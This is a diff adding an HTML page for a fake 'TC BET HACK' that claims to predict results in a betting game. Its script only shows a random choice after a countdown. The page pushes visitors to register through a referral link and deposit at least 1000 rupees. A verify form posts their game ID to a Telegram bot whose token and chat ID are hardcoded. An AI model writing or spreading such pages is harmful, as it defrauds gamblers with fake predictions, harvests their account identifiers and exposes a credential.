@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TC BET HACK</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        h1 {
+            color: #343a40;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #6c757d;
+            margin: 10px 0;
+        }
+        input {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ced4da;
+            width: calc(100% - 22px);
+            font-size: 16px;
+        }
+        button {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+            width: calc(100% - 22px);
+            font-size: 16px;
+            color: #fff;
+            background-color: #28a745;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .timer {
+            font-size: 24px;
+            margin: 20px 0;
+            color: #17a2b8;
+        }
+        .popup {
+            display: none;
+            background-color: #343a40;
+            color: #fff;
+            padding: 20px;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        .game-link {
+            color: #007bff;
+            text-decoration: none;
+            font-size: 18px;
+            display: block;
+            margin: 20px 0;
+        }
+        .game-link:hover {
+            text-decoration: underline;
+        }
+        .instructions {
+            text-align: left;
+        }
+        .instructions p {
+            margin: 5px 0;
+        }
+        .result {
+            font-size: 20px;
+            margin-top: 20px;
+            color: #dc3545;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>TC BET HACK</h1>
+    <p>ENTER LAST 3 DIGIT PERIOD NUMBER</p>
+    <input type="text" id="periodNumber" maxlength="3" placeholder="123">
+    <button id="hackButton" onclick="startHacking()">START HACKING</button>
+    <div class="timer" id="timer">0.20</div>
+    <div class="result" id="result"></div>
+    <a class="game-link" href="https://tcbet.in/register?r_code=zTiEG79303" target="_blank">Game Link</a>
+
+    <h2>HOW TO WORK HACK</h2>
+    <div class="instructions">
+        <p>1. Old Account Not Working First Register With My Link</p>
+        <p>2. Link - <a class="game-link" href="https://tcbet.in/register?r_code=zTiEG79303" target="_blank">tcbet.in/register?r_code=zTiEG79303</a></p>
+        <p>3. Make Minimum 1000rs recharge for Hack active</p>
+        <p>4. After Deposit Done Verify Your Account</p>
+    </div>
+
+    <input type="text" id="gameID" placeholder="Enter Your Game ID">
+    <button onclick="verifyGameID()">Verify</button>
+</div>
+
+<div id="popup" class="popup"></div>
+
+<script>
+    let timerElement = document.getElementById('timer');
+    let resultElement = document.getElementById('result');
+    let popup = document.getElementById('popup');
+    let storedResults = {};
+
+    function startHacking() {
+        let periodNumber = document.getElementById('periodNumber').value;
+        if (periodNumber.length !== 3 || isNaN(periodNumber)) {
+            alert('Please enter a valid 3 digit period number.');
+            return;
+        }
+
+        if (storedResults[periodNumber] && (Date.now() - storedResults[periodNumber].timestamp < 60000)) {
+            displayResult(storedResults[periodNumber].result);
+            return;
+        }
+
+        let count = 20;
+        let interval = setInterval(() => {
+            count--;
+            timerElement.textContent = '0.' + (count < 10 ? '0' : '') + count;
+            if (count === 0) {
+                clearInterval(interval);
+                generateResult(periodNumber);
+            }
+        }, 100);
+    }
+
+    function generateResult(periodNumber) {
+        let results = ['BIG', 'SMALL', 'RED', 'GREEN'];
+        let randomResult = results[Math.floor(Math.random() * results.length)];
+        storedResults[periodNumber] = {
+            result: randomResult,
+            timestamp: Date.now()
+        };
+        displayResult(randomResult);
+    }
+
+    function displayResult(result) {
+        resultElement.textContent = `Result: ${result}`;
+    }
+
+    async function verifyGameID() {
+        let gameID = document.getElementById('gameID').value;
+        if (!gameID) {
+            alert('Please enter your Game ID.');
+            return;
+        }
+
+        let response = await fetch(`https://api.telegram.org/bot6786405686:AAEvng8DbVD2-Lq16baqrmJw1xPxmo65UbE/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: '1902097730',
+                text: `Verify Game ID: ${gameID}`
+            })
+        });
+
+        if (response.ok) {
+            alert('Your request submitted. Please wait for action.');
+        } else {
+            alert('Failed to submit your request. Please try again.');
+        }
+    }
+</script>
+
+</body>
+</html>
